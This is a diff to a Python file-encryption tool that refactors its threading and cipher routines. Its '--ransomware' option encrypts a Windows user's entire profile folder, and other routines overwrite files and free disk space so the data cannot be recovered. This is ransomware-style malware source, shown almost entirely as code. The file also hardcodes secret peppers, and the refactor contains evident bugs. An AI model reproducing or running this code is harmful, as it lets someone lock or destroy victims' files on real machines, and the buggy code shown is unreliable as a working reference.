@@ -26,6 +26,8 @@ import time
 import psutil
 import shutil
 
+import pathlib
+
 # Customization Modules
 import colorama
 from colorama import Fore, Back, Style
@@ -76,39 +78,10 @@ def cleanup_handler(signal=0, frame=None, silent=False, exit_reason=""):
 	Returns:
 		int: 0
 	"""
-	
-	global bar_total
-
-	global accept_threads
-	accept_threads = False
-
-	global cleanup_status
-	cleanup_status = True
-
-	for thread in threads:
-		thread.join()
 
 	if not silent:
-		print(f"\n{Fore.LIGHTGREEN_EX}Exit reason: {exit_reason}\nExit code: {signal}{Style.RESET_ALL}\n", flush=True)
-
-	if bar_total == 0 and not interactive['init']:
-		py_pid = os.getpid()
-
-		os.kill(py_pid, 9)
+		print(f"\ncleanup_handler raised, signal: {signal} | reason: {exit_reason}")
 	return 0
-	
-# Register the handler
-if platform.system() == "Windows":
-	# kernel32 signal handler
-	kernel32 = ctypes.windll.kernel32
-	handler_type = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_ulong)
-
-	handler_func = handler_type(lambda signal: cleanup_handler(signal=signal, exit_reason="KeyboardInterrupt"))
-	kernel32.SetConsoleCtrlHandler(handler_func, True)
-
-	signal.signal(signal.SIGINT, lambda signal, frame: None)
-else:
-	signal.signal(signal.SIGINT, lambda signal, frame: cleanup_handler(signal=signal, frame=frame, exit_reason="KeyboardInterrupt"))
 
 # terminal progress bar
 def progress_bar(iteration, total, prefix='', suffix='', decimals=1, length=50, fill='='):
@@ -150,12 +123,6 @@ def progress_bar(iteration, total, prefix='', suffix='', decimals=1, length=50, 
 		Output:
 			Progress: |=====---------------------------------------------| 10.0% Complete
 	"""
-
-	if cleanup_status:
-		return 'CleanupInterrupt'
-	
-	if not set_progress_bar:
-		return 'BarDisabled'
 	
 	percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
 	filled_length = int(length * iteration // total)
@@ -166,153 +133,149 @@ def progress_bar(iteration, total, prefix='', suffix='', decimals=1, length=50, 
 
 # |==================================================| Threading functions |==================================================|
 
-# thread worker
-def worker(callback_function, *args, **kwargs):
-	"""
-	Call a function asynchronously using a worker function.
-	If this function is called using "worker()", this will not asynchronously execute.
-	
-	Parameters:
-		callback_function (func): callback function (required)
-			The function to asynchronously.
-			
-		*args: arguments passed (optional)
-			The arguments passed to the callback function.
-			
-		**kwargs: keyword arguments passed (optional)
-			The keyword arguments passed to the callback function.
-			
-	Returns:
-		None
+class ThreadManager:
+	def __init__(self):
+		self.threads_set = set()
+		self.semaphore = threading.Semaphore(5)
 		
-		str: "CleanupInterrupt"
+	# thread worker
+	def worker(self, callback_function, semaphore=None, threads_set=None, *args, **kwargs):
+		"""
+		Call a function asynchronously using a worker function.
+		If this function is called using "worker()", this will not asynchronously execute.
 		
-	Example usage:
-		Bare call (main thread call):
-			def my_func(arg1, arg2, kwarg1=""):
-				print(f"Arg1: {arg1} | Arg2: {arg2} | kwarg1: {kwarg1}")
-			
-			worker(my_func, "Arg1", "Arg2", kwarg1="MyKwarg")
-			
-			Output: Arg1: "Arg1" | Arg2: "Arg2" | kwarg1: "MyKwarg"
-		----------------------------------------------------------------
-		Note: Bare calling worker() will not call the callback_function asynchronously
-			
-		thread_create call (async call):
-			def my_func():
-				print("Simulating work. . .")
-				time.sleep(3)
-				print("Work done!")
-			
-			thread_create(my_func)
-			
-			print("Main thread starting!")
-			time.sleep(5)
-			
-			print("Main thread done!")
-			
-			Output:
-				Simulating work. . .
-				Main thread starting. . .
-				[3 second pause]
+		Parameters:
+			callback_function (func): callback function (required)
+				The function to asynchronously.
 				
-				Work done!
-				[2 second pause]
-				Main thread done!
-		------------------------------------------------------------------
-		Use thread_create() for asynchronous calls
-	"""
-	
-	global threads
-
-	if not accept_threads:
-		return 'CleanupInterrupt'
-	
-	try:
-		current_thread = threading.current_thread()
-
-		func_name = callback_function.__name__
-		with semaphore:  # acquire and release the semaphore
-			try:
-				callback_function(*args, **kwargs)
-			except Exception as err:
-				err_name = type(err).__name__
-				worker_errors.append(f"[worker, {func_name}] | Exception at thread {threading.get_ident()}, {err_name}, {err}")
-			finally:
-				threads.remove(current_thread)
-	except Exception as err:
-		err_name = type(err).__name__
-		worker_errors.append(f"Exception occured at worker function, {err_name}, {err}")
-
-# set max threads
-def threads_max(max_threads=5):
-	"""
-	Set the amount of threads that can use the threading semaphore
+			*args: arguments passed (optional)
+				The arguments passed to the callback function.
+				
+			**kwargs: keyword arguments passed (optional)
+				The keyword arguments passed to the callback function.
+				
+		Returns:
+			None
+			
+			str: "CleanupInterrupt"
+			
+		Example usage:
+			Bare call (main thread call):
+				def my_func(arg1, arg2, kwarg1=""):
+					print(f"Arg1: {arg1} | Arg2: {arg2} | kwarg1: {kwarg1}")
+				
+				worker(my_func, "Arg1", "Arg2", kwarg1="MyKwarg")
+				
+				Output: Arg1: "Arg1" | Arg2: "Arg2" | kwarg1: "MyKwarg"
+			----------------------------------------------------------------
+			Note: Bare calling worker() will not call the callback_function asynchronously
+				
+			thread_create call (async call):
+				def my_func():
+					print("Simulating work. . .")
+					time.sleep(3)
+					print("Work done!")
+				
+				thread_create(my_func)
+				
+				print("Main thread starting!")
+				time.sleep(5)
+				
+				print("Main thread done!")
+				
+				Output:
+					Simulating work. . .
+					Main thread starting. . .
+					[3 second pause]
+					
+					Work done!
+					[2 second pause]
+					Main thread done!
+			------------------------------------------------------------------
+			Use thread_create() for asynchronous calls
+		"""
 		
-	Parameters:
-		max_threads (int): max threads (optional, defaults to 5)
-			The amount of threads that can access the threading semaphore at once.
-			
-	Returns: 
-		None
-	
-	Example usage:
-		threads_max(7)
-			This will allow 7 threads at once to execute.
-			
-		threads_max("String")
-			This will raise a ValueError, stating that max_threads should be a valid integer.
-			
-		thread_max(26)
-			This will print a warning in the console, saying that too many threads will slow down your computer.
-	"""
-	
-	if not isinstance(max_threads, int):
-		raise ValueError("max_threads must be a valid integer!")
-
-	global semaphore
-	semaphore = threading.Semaphore(max_threads)
-
-	if semaphore._value > 15:
-		print(Fore.YELLOW + 'Warning: Having too many threads can slow down your computer!' + Style.RESET_ALL)
-
-# create a thread
-def thread_create(callback, thread_name="", *args, **kwargs):
-	"""
-	Create a thread to call a function asynchronously.
-	
-	Parameters:
-		callback (func): callback function (required)
-			The function to asynchronously.
-			
-		thread_name (str): thread name (optional, defaults to "" [Empty string)
-			The name for the thread created.
-			
-		*args: arguments passed (optional)
-			The arguments passed to the callback function.
-			
-		**kwargs: keyword arguments passed (optional)
-			The keyword arguments passed to the callback function.
-			
-	Returns:
-		thread object
+		if not threads_set:
+			threads_set = self.threads_set
 		
-	Example usage: Refer to the docstring of the worker function. (worker.__doc__)
-	"""
+		if not semaphore:
+			if semaphore == None:
+				semaphore = self.semaphore
+			else:
+				raise TypeError(f"expected a semaphore/lock, got {type(semaphore)}")
+		
+		if not isinstance(threads_set, (list, set, tuple)):
+			raise TypeError(f"threads expected a list/set/tuple, got {type(threads_set)}")
+		
+		try:
+			current_thread = threading.current_thread()
 
-	global threads
-	
-	thread = threading.Thread(target=worker, args=(callback, *args), kwargs=kwargs, name=thread_name)
-	
-	thread.start()
-	threads.append(thread)
+			func_name = callback_function.__name__
+			
+			with semaphore:  # acquire and release the semaphore
+				try:
+					callback_function(*args, **kwargs)
+				except Exception as err:
+					print("\nexception caught while calling: \n")
+					traceback.print_exc()
+				finally:
+					threads_set.remove(current_thread)
+		except Exception as err:
+			print(f"\nexception caught at worker: \n")
+			traceback.print_exc()
 
-	return thread
+	# create a thread
+	def thread_create(self, callback, semaphore=None, threads_set=None, thread_name="", *args, **kwargs):
+		"""
+		Create a thread to call a function asynchronously.
+		
+		Parameters:
+			callback (func): callback function (required)
+				The function to asynchronously.
+				
+			thread_name (str): thread name (optional, defaults to "" [Empty string)
+				The name for the thread created.
+				
+			*args: arguments passed (optional)
+				The arguments passed to the callback function.
+				
+			**kwargs: keyword arguments passed (optional)
+				The keyword arguments passed to the callback function.
+				
+		Returns:
+			thread object
+			
+		Example usage: Refer to the docstring of the worker function. (worker.__doc__)
+		"""
+		
+		if not threads_set:
+			threads_set = self.threads_set
+		
+		if not semaphore:
+			if semaphore == None:
+				semaphore = self.semaphore
+			else:
+				raise TypeError(f"expected a semaphore/lock, got {type(semaphore)}")
+		
+		if not isinstance(threads_set, (list, set, tuple)):
+			raise TypeError(f"threads expected a list/set/tuple, got {type(threads_set)}")
+		
+		thread = threading.Thread(
+			target = self.worker,
+			args = (callback, semaphore, threads_set, *args),
+			kwargs = kwargs,
+			name = thread_name
+		)
+		
+		threads_set.add(thread)
+		thread.start()
+
+		return thread
 
 # |==================================================| Iteration functions |==================================================|
 
 # iterate through a directory and optionally a subdirectory
-def iterate_dir(directory, iterate_tree=True, skip_dirs=[]):
+def iterate_dir(directory, iterate_tree=True, skip_dirs=None):
 	"""
 	Iterate through a directory while optionally iterating through the sub-directories
 	
@@ -417,61 +380,45 @@ def iterate_dir(directory, iterate_tree=True, skip_dirs=[]):
 			['C:\\MyPython\\a.txt']
 	"""
 	
+	if not skip_dirs:
+		skip_dirs = set()
+	
 	if iterate_tree not in [True, False]:
-		raise ValueError(f"iterate_tree expected boolean, got {iterate_tree}")
+		raise TypeError(f"iterate_tree expected boolean, got {iterate_tree}")
 
-	file_paths = []
-
+	file_paths = set()
+	
 	# Check argument if it's a directory
 	if not os.path.isdir(directory):
 		if os.path.isfile(directory):
 			raise NotADirectoryError(f'[Errno 21] Not a directory: {directory}')
 		else:
 			raise FileNotFoundError(f'[Errno 2] No such directory: {directory}')
-
+	
 	# Iterate through the directory, and catch PermissionErrors
-	# If iterateTree is true, also loop through the sub-dirs
 	try:
+		directory = os.path.abspath(directory)
+		
 		for filename in os.listdir(directory):
 			path = os.path.join(directory, filename)
-
+			
 			if path in skip_dirs:
 				continue
 
 			if os.path.isfile(path):
-				file_paths.append(path)
+				file_paths.add(path)
 
 			elif os.path.isdir(path) and iterate_tree:
-				file_paths.extend(iterate_dir(path))
+				file_paths.update(iterate_dir(path))
 	except PermissionError as err:
-		print(f"PermissionError: {err}")
+		print(f"Caught PermissionError: {err}")
 
 	return file_paths
-
-# check if a file exists
-def find_file(file_path):
-	try:
-		if os.path.isfile(file_path):
-			return True
-		else:
-			return False
-	except PermissionError as err:
-		permission_errors.append(f"find_file | A PermissonError occured! Path: \"{file_path}\"")
-
-# check a directory if it exists
-def find_dir(directory_path):
-	try:
-		if os.path.isdir(directory_path):
-			return True
-		else:
-			return False
-	except PermissionError as err:
-		permission_errors.append(f"find_dir | A PermissonError occured! Path: \"{directory_path}\"")
 
 # |==================================================| Cipher functions |==================================================|
 
 # encryption function
-def encrypt_file(input_file, password="", keep_copy=False, hash_pepper=b"", password_pepper=b""):
+def encrypt_file(input_file=None, password="", keep_copy=False, hash_pepper=b"", password_pepper=b""):
 	"""
 	Define a function to encrypt a file in chunks
 	using the cryptography.Fernet module.
@@ -583,11 +530,14 @@ def encrypt_file(input_file, password="", keep_copy=False, hash_pepper=b"", pass
 	"""
 	
 	# Guard clauses
+	if not input_file:
+		raise TypeError(f"missing 1 required keyword argument: input_file")
+	
 	if input_file == sys.argv[0]:
 		raise ValueError(f"illegal operation [input_file == {sys.argv[0]}]")
 
 	if keep_copy not in [True, False]:
-		raise ValueError(f'keep_copy expected boolean, got {keep_copy}')
+		raise TypeError(f'keep_copy expected boolean, got {keep_copy}')
 
 	# Check argument if it's a file
 	if not os.path.isfile(input_file):
@@ -763,8 +713,8 @@ def decrypt_file(input_file, password="", keep_copy=False, hash_pepper=b"", pass
 	if input_file == sys.argv[0]:
 		raise ValueError(f"illegal operation [input_file == {sys.argv[0]}]")
 
-	if keep_copy not in [1, 0]:
-		raise ValueError(f'expected boolean, got {keep_copy}')
+	if keep_copy not in [True, False]:
+		raise TypeError(f'expected boolean, got {keep_copy}')
 
 	# Check argument if it's a file
 	if not os.path.isfile(input_file):
@@ -826,7 +776,6 @@ def decrypt_file(input_file, password="", keep_copy=False, hash_pepper=b"", pass
 			file.seek(cursor_position, os.SEEK_SET)
 			chunk = file.read(50 * 1024 * 1024)
 		
-		print(plaintext_end)
 		file.truncate(plaintext_end)
 	return 0
 
@@ -861,14 +810,6 @@ def file_overwrite(file_path, file_size):
 				chunk_data = os.urandom(2) # All other passes
 			
 			while file_size > 0:
-				if cleanup_status:
-					file.truncate(0)
-					file.close()
-					
-					os.remove(file_path)
-					
-					return
-				
 				chunk = min(file_size, 50 * 1024 * 1024)
 				
 				file.write(chunk_data * chunk)
@@ -903,14 +844,6 @@ def freespace_overwrite():
 					chunk_data = os.urandom(2)
 				
 				while free_space > 0:
-					if cleanup_status:
-						file.truncate(0)
-						file.close()
-						
-						os.remove("disk_filler_file.tmp")
-						
-						raise KeyboardInterrupt
-					
 					file.write(chunk_data * chunk)
 					free_space -= chunk
 						
@@ -921,8 +854,6 @@ def freespace_overwrite():
 			
 			file.close()
 			os.remove("disk_filler_file.tmp")
-		except KeyboardInterrupt:
-			pass
 		except Exception as err:
 			err_name = type(err).__name__
 			
@@ -967,50 +898,32 @@ def debug_info(interactive_call=False):
 	print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
 
 class Main:
-	if __name__ != "__main__":
-		raise RuntimeError("class Main must be called as __main__")
-	
 	def __init__(self):
+		if __name__ != "__main__":
+			raise RuntimeError("class Main must be called as __main__")
+
 		# pepper | DO NOT LEAK THIS!
 		self.hash_pepper = b'\xf0f\x9e\x10\xca\xbf\xca\xc4\xf1\xfd\xee\x00\xab7b\xc8\x1em1`\xb1\x821b\xf8&\xa1\xa9(\xb0\xa6\x0b'
 		self.password_pepper = b'\xd3\x9dh4N\x0c\xbc\xac\x17\xc1\xd7\xa5\x88\x8a2\xceI\x96\x10\x86A\n@\x19\x12\xfc\x8bi\xc8\tIA'
-
-		# Progress bar variables
-		self.bar_iteration = 0
-		self.bar_total = 0
-
-		# args variables
-		self.files_count = 0
-		self.files_finished = 0
-		self.files_exception_thrown = 0
-
+		
+		self.main_dict = {
+			"bar_iteration": 0,
+			"bar_total": 0,
+			
+			"files_count": 0,
+			"files_finished": 0,
+		}
+		
 		# cleanup variables
-		self.accept_threads = True
-		self.cleanup_status = False
-
+		self.cleanup = False
 		self.set_progress_bar = True
-		# semaphore
-		semaphore = threading.Semaphore(5)
 
-		# Threads created in worker function
-		threads = []
-
-		# Error lists
-		worker_errors = []
-		permission_errors = []
-
-		file_errors = []
-		dir_errors = []
-
-		interactive = {'init': False}
+		self.interactive = {'init': False}
 
 		# misc
-		memory_max_allocated = 300 * 1024 * 1024  # 300MB
-		current_user = os.getlogin()
-
-		class ArgumentError(Exception):
-			pass
-
+		self.thread_mgr = ThreadManager()
+		self.thread_create = ThreadManager().thread_create
+		
 		# self.parser objects
 		self.args = None
 		
@@ -1087,15 +1000,7 @@ class Main:
 		
 		"""
 		
-		interactive['init'] = True
-		
-		global files_count
-		global files_finished
-		global files_exception_thrown
-
-		global bar_total
-		global current_user
-		global set_progress_bar
+		self.interactive['init'] = True
 		
 		def tokenize(string):
 			tokens = []
@@ -1127,10 +1032,8 @@ class Main:
 			
 			return tokens
 		
-		main = Main()
-		
 		while True:
-			if cleanup_status:
+			if self.cleanup:
 				break
 			
 			time.sleep(0.01)
@@ -1171,7 +1074,7 @@ class Main:
 					sys.stdout.write("|-------------------------------------------------------------|\n")
 					sys.stdout.flush()
 					
-					main.ransomware(
+					self.ransomware(
 						dir_list,
 						skip_directories=skip_dirs,
 						verbose=True,
@@ -1195,13 +1098,14 @@ class Main:
 					sys.stdout.flush()
 					
 					if files:
-						main.cipher_file(
+						self.cipher_file(
 							files,
 							verbose=True,
 							password=password,
 							keep_copy=keep_copy,
 							cipher_method="encrypt"
 						)
+					
 				if "-dr " in encryption_arguments or "--directory " in encryption_arguments:
 					args1 = encryption_arguments.replace("-dr ", "")
 					argument_directories = args1.replace("--directory ", "")
@@ -1214,7 +1118,7 @@ class Main:
 					sys.stdout.flush()
 					
 					if directories:
-						main.cipher_directory(
+						self.cipher_directory(
 							directories,
 							verbose=True,
 							password=password,
@@ -1250,7 +1154,7 @@ class Main:
 					sys.stdout.write("|-------------------------------------------------------------|\n")
 					sys.stdout.flush()
 					
-					main.ransomware(
+					self.ransomware(
 						dir_list,
 						skip_directories=skip_dirs,
 						verbose=True,
@@ -1274,7 +1178,7 @@ class Main:
 					sys.stdout.flush()
 					
 					if files:
-						main.cipher_file(
+						self.cipher_file(
 							files,
 							verbose=True,
 							password=password,
@@ -1293,7 +1197,7 @@ class Main:
 					sys.stdout.flush()
 					
 					if directories:
-						main.cipher_directory(
+						self.cipher_directory(
 							directories,
 							verbose=True,
 							password=password,
@@ -1323,11 +1227,11 @@ class Main:
 					i = 0
 					
 					for pass_iteration in range(3):
-						interactive[f"freespace_overwrite | pass{pass_iteration + 1}_complete"] = False
+						self.interactive[f"freespace_overwrite | pass{pass_iteration + 1}_complete"] = False
 				
 					current_pass = 1
 					
-					thread = thread_create(
+					thread = self.thread_create(
 						callback = freespace_overwrite
 					)
 					
@@ -1337,8 +1241,8 @@ class Main:
 					def get_tempfile_size():
 						tempfile_size = 0
 						
-						while not interactive[f"freespace_overwrite | pass3_complete"]:
-							if cleanup_status:
+						while not self.interactive[f"freespace_overwrite | pass3_complete"]:
+							if self.cleanup:
 								break
 							
 							try:
@@ -1354,16 +1258,16 @@ class Main:
 							
 							time.sleep(0.01)
 					
-					thread = thread_create(
+					thread = self.thread_create(
 						callback = get_tempfile_size
 					)
 					
 					while True:
-						if cleanup_status:
+						if self.cleanup:
 							sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . stopped\n\n")
 							break
 						
-						if interactive[f"freespace_overwrite | pass{current_pass}_complete"] == True:
+						if self.interactive[f"freespace_overwrite | pass{current_pass}_complete"] == True:
 							end_time = time.perf_counter()
 							sys.stdout.write(f"\b{' ' for i in range(100)}")
 							
@@ -1416,25 +1320,27 @@ class Main:
 					symbols = ['\\', '|', '/', '-']
 					i = 0
 						
-					interactive[f"{files[current_file]} | cipher_complete"] = False
+					self.interactive[f"{files[current_file]} | cipher_complete"] = False
 					
 					for iteration in range(16):
-						interactive[f"{files[current_file]} | pass{iteration + 1}_complete"] = False
+						self.interactive[f"{files[current_file]} | pass{iteration + 1}_complete"] = False
 					
 					current_file_size = os.path.getsize(files[current_file])
 					
 					def call_cipher(cipher_mode="encrypt", *args):
 						encrypt_file(*args) if cipher_mode == "encrypt" else decrypt_file(*args)
 						
-						interactive[f"{files[current_file]} | cipher_complete"]
+						self.interactive[f"{files[current_file]} | cipher_complete"]
 						
-					thread = thread_create(
-						callback = cipher,
-						cipher_mode = "encrypt",
-						input_file = files[current_file], 
-						password = os.urandom(64),
-						keep_copy = False,
-						override_raise=True
+					thread = self.thread_create(
+						callback = call_cipher,
+						
+						input_file = file,
+						password = password,
+						keep_copy = keep_copy,
+						
+						hash_pepper = self.hash_pepper,
+						password_pepper = self.password_pepper
 					)
 					
 					total_start_time = time.time()
@@ -1443,11 +1349,11 @@ class Main:
 					start_time = time.perf_counter()
 					
 					while True:
-						if cleanup_status:
+						if self.cleanup:
 							sys.stdout.write(f"\rwaiting for encryption to finish. . . stopped\n\n")
 							break
 						
-						if interactive[f"{files[current_file]} | cipher_complete"] == True:
+						if self.interactive[f"{files[current_file]} | cipher_complete"] == True:
 							end_time = time.perf_counter()
 							sys.stdout.write(f"\rwaiting for encryption to finish. . . done [finished in {(end_time - start_time):.2f} seconds]\n\n")
 							
@@ -1458,7 +1364,7 @@ class Main:
 						
 						time.sleep(0.1)
 					
-					thread = thread_create(
+					thread = self.thread_create(
 						callback = file_overwrite,
 						file_path = files[current_file],
 						file_size = current_file_size
@@ -1468,11 +1374,11 @@ class Main:
 					start_time = time.perf_counter()
 					
 					while True:
-						if cleanup_status:
+						if self.cleanup:
 							sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . stopped\n\n")
 							break
 						
-						if interactive[f"{files[current_file]} | pass{current_pass}_complete"] == True:
+						if self.interactive[f"{files[current_file]} | pass{current_pass}_complete"] == True:
 							end_time = time.perf_counter()
 							
 							sys.stdout.write("\r")
@@ -1514,8 +1420,6 @@ class Main:
 			...
 
 	def parse_args(self):
-		main = Main()
-		
 		self.args = self.parser.parse_args()
 		
 		# Guard clauses
@@ -1532,30 +1436,31 @@ class Main:
 			return
 		
 		if self.args.threads:
-			threads_max(args.threads)
+			self.thread_mgr.semaphore = self.args.threads
 		
 		if self.args.encrypt and self.args.decrypt:
-			raise ArgumentError("Both encryption and decryption switches cannot be enabled!\nType -h/--help for help.")
+			raise ValueError("expected 1 required argument [-e/--encrypt] or [-d/--decrypt], got 2")
 
 		if not self.args.encrypt and not self.args.decrypt:
-			raise ArgumentError("Neither encryption nor decryption switches aren't specified!\nType -h/--help for help.")
+			raise ValueError("expected 1 required argument [-e/--encrypt] or [-d/--decrypt]")
 		
-		atexit.register(debug_info)
+		# atexit.register(debug_info)
 		
 		if self.args.ransomware:
 			cipher_method = "encrypt" if self.args.encrypt else "decrypt"
+			current_user = os.getlogin()
 			
-			main.ransomware(
+			self.cipher_directory(
 				f"C:\\Users\\{current_user}",
-				verbose=self.args.verbose,
-				password=password,
-				keep_copy=self.args.keep_copy,
-				cipher_method=cipher_method
+				verbose = self.args.verbose,
+				password = password,
+				keep_copy = self.args.keep_copy,
+				cipher_method = cipher_method
 			)
 			sys.exit()
 
 		if self.args.file is None and self.args.directory is None:
-			raise ArgumentError("No file/directory specified!\nType -h/--help for help.")
+			raise ValueError("expected valid file/directory paths, got None")
 		
 		password = getpass.getpass("Enter a password: ")
 		
@@ -1565,192 +1470,72 @@ class Main:
 		sys.stdout.flush()
 		
 		if self.args.file:
-			main.cipher_file(
+			self.cipher_file(
 				self.args.file,
-				verbose=self.args.verbose,
-				password=password,
-				keep_copy=self.args.keep_copy,
-				cipher_method=cipher_method
+				verbose = self.args.verbose,
+				password = password,
+				keep_copy = self.args.keep_copy,
+				cipher_method = cipher_method
 			)
 		
 		if self.args.directory:
-			main.cipher_directory(
+			self.cipher_directory(
 				self.args.directory,
-				verbose=self.args.verbose,
-				password=password,
-				keep_copy=self.args.keep_copy,
-				cipher_method=cipher_method
+				verbose = self.args.verbose,
+				password = password,
+				keep_copy = self.args.keep_copy,
+				cipher_method = cipher_method
 			)
 	
-	def ransomware(self, directories, skip_directories=[], verbose=True, password="", keep_copy=False, cipher_method="encrypt"):
-		global files_count
-		global files_finished
-		global files_exception_thrown
-		
-		global bar_total
-		
-		if cipher_method not in ["encrypt", "decrypt"]:
-			raise ValueError(f'cipher_method expected "encrypt" or "decrypt", got {cipher_method}')
-		
-		files = []
-		folders = []
-		files_errorlist = []
-		
-		for folder in directories:
-			if find_dir(folder):
-				folders.append(folder)
-				continue
-			
-			if os.path.isfile(folder):
-				dir_errors.append(f"-rw | Directory \"{folder}\" is a file!")
-			elif len(directories) > 1:
-				# Don't throw an error for mass searching
-				dir_errors.append(f"-rw | Directory \"{folder}\" isn't a directory!")
-			else:
-				# Throw an error if less than two directories are being processed
-				dir_errors.append(f"-rw | Directory \"{folder}\" isn't a directory!")
-
-				raise NotADirectoryError(f"Directory \"{folder}\" isn't a directory!")
-		
-		for i, folder in enumerate(folders):
-			files = iterate_dir(folder, iterate_tree=True, skip_dirs=skip_directories)
-
-		for i, file in enumerate(files):
-			files_count += 1
-
-			file_name, file_ext = os.path.splitext(file)
-			file_size = os.path.getsize(file)
-
-			if file_ext in [".exe", ".dll", ".vhd", ".vdi", ".iso", ".vbox", ".vhdx", ".sys"]:
-				files_exception_thrown += 1
-
-				files_errorlist.append(file_name + file_ext + " | Binary file")
-				files.remove(file)
-				continue
-			elif file_size > memory_max_allocated:
-				files_exception_thrown += 1
-
-				files_errorlist.append(file_name + file_ext + " | File too large")
-				files.remove(file)
-				continue
-
-		bar_total = files_count
-		
-		for i, file in enumerate(files):
-			if cleanup_status:
-				break
-
-			if cipher_method == "encrypt":
-				thread = thread_create(
-					callback = encrypt_file, 
-					input_file = file, 
-					password = password,
-					keep_copy = keep_copy
-				)
-			elif cipher_method == "decrypt":
-				thread = thread_create(
-					callback = decrypt_file, 
-					input_file = file, 
-					password = password,
-					keep_copy = keep_copy
-				)
-		
-		while len(threads) > 0:
-			time.sleep(0.05)
-
-			if cleanup_status:
-				break
-
-		if verbose:
-			print(f"\n|-------------------------------------------------------------|\n\nTotal files : {files_count}")
-			print(f"Total files [processed] : {files_finished}\n")
-
-			print(f"Total: {files_count} | Completed: {files_finished} | Error thrown: {files_exception_thrown}\n")
-
-			print(f"Extra information: \nfiles_count: {files_count} | len(files): {len(files)}")
-			print(f"files_finished: {files_finished} | files_finished == files_count: {files_finished == files_count}\n")
-
-			# File and directory errors
-			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
-			print(f"{Fore.LIGHTGREEN_EX}File errorlist: (-dr){Style.RESET_ALL}\n")
-
-			for err in files_errorlist:
-				print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
-				print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)
-
-			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
-	
 	# Check each file/directory
-	def cipher_file(self, file_list, skip_files=[], verbose=True, password="", keep_copy=False, cipher_method="encrypt"):
-		global files_count
-		global files_finished
-		global files_exception_thrown
-		
-		global bar_total
-		
+	def cipher_file(self, file_list, skip_files=None, verbose=True, password="", keep_copy=False, cipher_method="encrypt"):
 		if cipher_method not in ["encrypt", "decrypt"]:
-			raise ValueError(f'cipher_method expected "encrypt" or "decrypt", got {cipher_method}')
+			raise TypeError(f'cipher_method expected "encrypt" or "decrypt", got {cipher_method}')
 		
-		files = []
-		files_errorlist = []
+		if not skip_files:
+			skip_files = set()
+		
+		files = set()
 
 		for file in file_list:
-			if find_file(file):
-				files.append(file)
+			if os.path.isfile(file):
+				files.add(file)
 				continue
 
-			if os.path.isdir(file):
-				file_errors.append(f"-f | File \"{file}\" is a directory!")
-			elif len(files) > 1:
-				print(f"Error: expected valid file path, got {file}")
+			if len(files) > 1:
+				if os.path.isdir(file):
+					print(f"IsADirectoryError: [Errno 21] Is a directory: {file}")
+				else:
+					print(f"FileNotFoundError: [Errno 2] No such file: {file}")
 			else:
-				raise FileNotFoundError(f"File \"{file}\" isn't a file!")
-
+				if os.path.isdir(file):
+					raise IsADirectoryError(f"[Errno 21] Is a directory: {file}")
+				else:
+					raise FileNotFoundError(f"[Errno 2] No such file: {file}")
+		
 		for i, file in enumerate(files):
-			files_count += 1
-
-			file_name, file_ext = os.path.splitext(file)
-			file_size = os.path.getsize(file)
-
-			if file_ext in [".exe", ".dll", ".vhd", ".vdi", ".iso", ".vbox", ".vhdx", ".sys"]:
-				files_exception_thrown += 1
-
-				files_errorlist.append(file_name + file_ext + " | Binary file")
-				files.remove(file)
-				continue
-			elif file_size > memory_max_allocated:
-				files_exception_thrown += 1
-
-				files_errorlist.append(file_name + file_ext + " | File too large")
-				files.remove(file)
-				continue
-
-		bar_total = files_count
-		for i, file in enumerate(files):
-			if cleanup_status:
+			if self.cleanup:
 				break
-
-			if cipher_method == "encrypt":
-				thread = thread_create(
-					callback = encrypt_file, 
-					input_file = file, 
-					password = password,
-					keep_copy = keep_copy
-				)
-			elif cipher_method == "decrypt":
-				thread = thread_create(
-					callback = decrypt_file, 
-					input_file = file, 
-					password = password,
-					keep_copy = keep_copy
-				)
-
-		while len(threads) > 0:
-			time.sleep(0.05)
-
-			if cleanup_status:
-				break
-
+			
+			def call_cipher(*args, **kwargs):
+				if cipher_method == "encrypt":
+					encrypt_file(*args, **kwargs)
+				else:
+					decrypt_file(*args, **kwargs)
+				
+			thread = self.thread_create(
+				callback = call_cipher,
+				
+				input_file = file,
+				password = password,
+				keep_copy = keep_copy,
+				
+				hash_pepper = self.hash_pepper,
+				password_pepper = self.password_pepper
+			)
+		
+		thread.join()
+		
 		if verbose:
 			print(f"\n|-------------------------------------------------------------|\n\nTotal files : {files_count}")
 			print(f"Total files [processed] : {files_finished}\n")
@@ -1771,12 +1556,6 @@ class Main:
 			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
 
 	def cipher_directory(self, directories, skip_directories=[], verbose=True, password="", keep_copy=False, cipher_method="encrypt"):
-		global files_count
-		global files_finished
-		global files_exception_thrown
-		
-		global bar_total
-		
 		if cipher_method not in ["encrypt", "decrypt"]:
 			raise ValueError(f'cipher_method expected "encrypt" or "decrypt", got {cipher_method}')
 		
@@ -1784,68 +1563,48 @@ class Main:
 		files_errorlist = []
 
 		for folder in directories:
-			if find_dir(folder):
+			if os.path.isdir(folder):
 				folders.append(folder)
 				continue
-
-			if os.path.isfile(folder):
-				dir_errors.append(f"-dr | Directory \"{folder}\" is a file!")
-			elif len(directories) > 1:
-				# Don't throw an error for mass searching
-				dir_errors.append(f"-dr | Directory \"{folder}\" isn't a directory!")
+			
+			if len(directories) > 1:
+				if os.path.isdir(folder):
+					print(f"NotADirectoryError: [Errno 21] Is a directory: {folder}")
+				else:
+					print(f"FileNotFoundError: [Errno 2] No such file: {folder}")
 			else:
-				# Throw an error if less than two directories are being processed
-				dir_errors.append(f"-dr | Directory \"{folder}\" isn't a directory!")
-
-				raise NotADirectoryError(f"Directory \"{folder}\" isn't a directory!")
+				if os.path.isdir(folder):
+					raise NotADirectoryError(f"[Errno 20] Is a directory: {folder}")
+				else:
+					raise FileNotFoundError(f"[Errno 2] No such directory: {folder}")
 
 		for i, folder in enumerate(folders):
-			files = iterate_dir(folder, args.deep_search)
-
+			returned_files = iterate_dir(folder, iterate_tree=True, skip_dirs=skip_directories)
+			
+			files.add(*returned_files)
+		
